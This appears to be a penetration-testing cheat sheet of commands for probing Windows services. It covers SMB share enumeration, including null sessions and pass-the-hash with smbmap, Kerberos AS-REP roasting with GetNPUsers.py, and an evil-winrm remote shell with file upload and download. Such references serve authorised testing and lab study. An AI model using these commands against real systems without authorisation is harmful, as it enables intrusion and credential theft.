### [SMB Enumeration p445]
SMBClient
```
Smbclient //ipaddress/share
```
Null Session
```
smbclient -N //IP/Sub
```
SMBv2 Mode
```
smbclient -m SMB2 '//ipaddress/c$/path/to/share' -W <WORKSTATION> -U <username>
```

smbmap commands
```
Smbmap -H <ipaddress>
```
```
Smbmap -H <ipaddress> -u <username>
```
```
Smbmap -H <ipaddress> -u <username> -R
```
```
Smbmap -u <username> -d <domain> -p 'password' -H <ipaddress>
```
```
smbmap -u <username> -p <hash> -H <ipaddress>
```

Enum4linux
```
enum4linux -a IP
```

smbcacls
```
smbcacls -N '//IP/Sub' /Users
```

### [Kerberos Enumeration p88]
```
GetNPUsers.py WORKSTATION/ -dc-ip IP -usersfile /path/to/userslist
GetNPUsers.py NAME.LOCAL/ -dc-ip IP -usersfile /path/to/userslist
```
### [Windows Remote Management WinRM p5985]
```
ruby evil-winrm.rb -i IP -u username -p 'password' -s '/path/to/scripts/' -e '/path/to/exes/'
```
Download / Upload
```
upload local_filename
download remote_filename
```
